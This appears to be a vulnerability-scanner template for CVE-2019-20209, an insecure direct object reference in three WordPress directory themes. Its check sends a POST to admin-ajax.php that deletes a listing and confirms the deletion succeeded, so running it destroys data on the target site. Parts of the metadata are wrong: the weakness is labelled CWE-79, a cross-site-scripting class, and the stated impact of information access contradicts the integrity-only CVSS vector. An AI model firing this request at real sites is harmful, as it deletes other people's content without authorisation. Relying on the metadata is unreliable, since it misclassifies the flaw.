id: CVE-2019-20209

info:
  name: IDOR in CTHthemes CityBook, TownHub, and EasyBook
  author: ProjectDiscoveryAI
  severity: high
  description: The CTHthemes CityBook before 2.3.4, TownHub before 1.0.6, and EasyBook before 1.2.2 themes for WordPress allow insecure Direct Object Reference (IDOR) via wp-admin/admin-ajax.php to delete any page/post/listing.
  impact: |
    Potential unauthorized access to sensitive information.
  remediation: |
    Implement proper access controls and authorization checks to prevent IDOR attacks.
  reference:
    - https://themeforest.net/item/citybook-directory-listing-wordpress-theme/21694727
    - https://themeforest.net/item/easybook-directory-listing-wordpress-theme/23206622
    - https://themeforest.net/item/townhub-directory-listing-wordpress-theme/25019571
    - https://wpvulndb.com/vulnerabilities/10013
    - https://wpvulndb.com/vulnerabilities/10014
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-20209
    cwe-id: CWE-79
    epss-score: 0.00681
    epss-percentile: 0.80602
    cpe: cpe:2.3:a:cththemes:citybook:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: cththemes
    product: citybook
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest

    body: |
      action=townhub_addons_delete_listing&lid={{listing_id}}&_nonce={{nonce}}&_wpnonce={{wpnonce}}
    matchers:
      - type: word
        words:
          - "Listing deleted successfully"
        part: body
